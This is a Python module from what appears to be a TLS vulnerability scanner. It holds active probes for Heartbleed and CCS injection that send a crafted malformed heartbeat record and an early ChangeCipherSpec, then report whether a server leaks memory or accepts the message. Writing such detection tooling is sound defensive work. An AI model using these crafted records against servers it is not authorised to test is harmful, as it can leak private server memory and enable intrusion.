"""Active probes: checks that send crafted, potentially disruptive traffic.

These are not passive observation -- they poke the server with malformed input to
see how it reacts, so they run only behind ``--active`` and against a server you
are authorised to test. For now: Heartbleed (CVE-2014-0160), which needs no
completed handshake -- the malformed heartbeat is sent in the clear, right after
the server's opening record, and a vulnerable server answers with a chunk of its
own memory.
"""

from __future__ import annotations

import socket
from dataclasses import dataclass
from typing import Optional

from .constants import (
    CONTENT_TYPE_ALERT,
    CONTENT_TYPE_CHANGE_CIPHER_SPEC,
    CONTENT_TYPE_HEARTBEAT,
    PROTOCOL_VERSIONS,
)
from .messages import build_client_hello
from .probe import DEFAULT_TIMEOUT, _recv_exact
from .tls12 import _read_flight

_TLS12 = PROTOCOL_VERSIONS[1]
# A spread of common TLS 1.2 suites, so a server has something to pick.
_TLS12_CIPHERS = [0xC02F, 0xC02B, 0xC030, 0xC02C, 0x009C, 0x009D, 0x002F, 0x0035]
_GROUPS = [0x001D, 0x0017, 0x0018]
_SIGNATURE_SCHEMES = [0x0403, 0x0503, 0x0804, 0x0805, 0x0401, 0x0501]
#: heartbeat_request(1), payload_length 0x4000, and no actual payload: a server
#: that honours the length leaks up to 16 KiB of its memory.
_MALFORMED_HEARTBEAT = bytes([CONTENT_TYPE_HEARTBEAT, 0x03, 0x03, 0x00, 0x03, 0x01, 0x40, 0x00])
#: A ChangeCipherSpec sent too early -- before the ClientKeyExchange.
_EARLY_CHANGE_CIPHER_SPEC = bytes([CONTENT_TYPE_CHANGE_CIPHER_SPEC, 3, 3, 0, 1, 1])


@dataclass
class HeartbleedResult:
    """The outcome of the Heartbleed probe."""

    vulnerable: bool = False
    detail: str = ""


@dataclass
class CcsInjectionResult:
    """The outcome of the CCS-injection probe."""

    vulnerable: bool = False
    detail: str = ""


def _read_record(sock: socket.socket) -> Optional[bytes]:
    header = _recv_exact(sock, 5)
    if header is None:
        return None
    length = int.from_bytes(header[3:5], "big")
    fragment = _recv_exact(sock, length)  # returns b"" for a zero-length record
    if fragment is None:
        return None
    return header + fragment


def check_heartbleed(
    host: str, port: int, sni: str = "", timeout: float = DEFAULT_TIMEOUT
) -> HeartbleedResult:
    """Probe for Heartbleed (CVE-2014-0160). Sends one malformed heartbeat."""
    hello = build_client_hello(
        _TLS12,
        _TLS12_CIPHERS,
        server_name=sni,
        groups=_GROUPS,
        signature_schemes=_SIGNATURE_SCHEMES,
        heartbeat=True,
    )
    try:
        sock = socket.create_connection((host, port), timeout)
    except OSError:
        return HeartbleedResult(detail="connection failed")
    try:
        sock.settimeout(timeout)
        sock.sendall(hello)
        if _read_record(sock) is None:
            return HeartbleedResult(detail="no response from the server")
        sock.sendall(_MALFORMED_HEARTBEAT)
        # Read on past the rest of the flight; a heartbeat record is the tell.
        for _ in range(16):
            record = _read_record(sock)
            if record is None:
                break
            if record[0] == CONTENT_TYPE_HEARTBEAT:
                leaked = int.from_bytes(record[3:5], "big")
                if leaked > 3:  # more than the 3-byte request: memory came back
                    return HeartbleedResult(
                        vulnerable=True, detail=f"the server leaked {leaked} bytes"
                    )
                return HeartbleedResult(detail="the heartbeat was answered without a leak")
            if record[0] == CONTENT_TYPE_ALERT:
                return HeartbleedResult(detail="the server refused the heartbeat")
    except OSError:
        return HeartbleedResult(detail="network error during the probe")
    finally:
        sock.close()
    return HeartbleedResult(detail="no heartbeat response")


def check_ccs_injection(
    host: str, port: int, sni: str = "", timeout: float = DEFAULT_TIMEOUT
) -> CcsInjectionResult:
    """Probe for CCS injection (CVE-2014-0224). Sends a ChangeCipherSpec too early.

    A patched server rejects it with an alert; a vulnerable one accepts it -- and
    then waits, silently, for the rest of a handshake keyed from an empty secret.
    """
    hello = build_client_hello(
        _TLS12, _TLS12_CIPHERS, server_name=sni, groups=_GROUPS,
        signature_schemes=_SIGNATURE_SCHEMES,
    )
    try:
        sock = socket.create_connection((host, port), timeout)
    except OSError:
        return CcsInjectionResult(detail="connection failed")
    try:
        sock.settimeout(timeout)
        sock.sendall(hello)
        _flight, error = _read_flight(sock)
        if error is not None:
            return CcsInjectionResult(detail="no complete server flight")
        sock.sendall(_EARLY_CHANGE_CIPHER_SPEC)
        try:
            reply = sock.recv(5)
        except (TimeoutError, socket.timeout):
            # Neither an alert nor a close: the server accepted the early CCS.
            # socket.timeout only became an alias of TimeoutError in 3.10; on the
            # 3.9 the tool still supports it is a distinct OSError subclass, so it
            # must be named explicitly or this "held open" verdict is missed.
            return CcsInjectionResult(vulnerable=True, detail="an early ChangeCipherSpec held open")
        if not reply:
            return CcsInjectionResult(detail="the server closed on the early ChangeCipherSpec")
        if reply[0] == CONTENT_TYPE_ALERT:
            return CcsInjectionResult(detail="the server rejected the early ChangeCipherSpec")
        return CcsInjectionResult(
            vulnerable=True, detail="the server tolerated an early ChangeCipherSpec"
        )
    except OSError:
        return CcsInjectionResult(detail="network error during the probe")
    finally:
        sock.close()
